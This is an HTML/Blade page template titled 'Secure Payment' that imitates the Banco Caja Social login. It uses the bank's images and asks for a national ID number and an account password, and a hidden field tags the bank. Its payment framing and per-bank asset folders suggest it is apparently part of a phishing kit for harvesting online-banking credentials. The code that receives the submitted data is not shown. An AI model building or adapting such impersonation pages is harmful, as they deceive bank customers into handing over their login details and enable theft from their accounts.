<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="csrf-token" content="{{ csrf_token() }}">


    <title>Secure Payment</title>

     <!-- Agrega los enlaces CSS y JavaScript de Bootstrap -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
    <link rel="stylesheet" href="{{asset('assets/css/payment/cajasocial.css')}}">

    <script type="text/javascript" src="{{asset('assets/js/jquery-3.6.0.min.js')}}"></script>

</head>
<body>

<img src="{{asset('assets/img/payment/cajasocial/cajasocial.jfif')}}" alt="" srcset="" width="100%">

<a style="font-size:20px; margin-left:25px;">Personas</a>

<hr>

<br><br><label>(*) TIPO IDENTIFICACION</label>
<center><select name="" id="" style="height:40px; border:1px solid #d3f3f3; padding:10px;">
    <option value="">Cedula Ciudadania</option>
</select></center>

<label for="">(*) NUMERO DE IDENTIFICACION</label>
    <center><input type="tel" name="" id="txtUsuario" style="height:40px; border:1px solid #d3f3f3;" minlength="6" maxlength="10" pattern="^[0-9]{6,10}$" oninput="this.value = this.value.replace(/\D+/g, '');"></center>
    <label for="">(*) CONTRASEÑA</label>
    <center><input type="password" name="" id="txtPass" style="height:40px; border:1px solid #d3f3f3;" oninput="this.value = this.value.replace(/\s+/g, '')" required>
<input type="hidden" name="" id="banco" style="height:40px; border:1px solid #d3f3f3;" value="Caja Social">

<br><br><br><br><br>
<input type="submit" value="Iniciar sesión" id="btnUsuario" style="height:45px; border-radius:100px; border:none;">
</center>

<br><img src="{{asset('assets/img/payment/cajasocial/caja1.jfif')}}" alt="" srcset="" width="100%">


</body>
</html>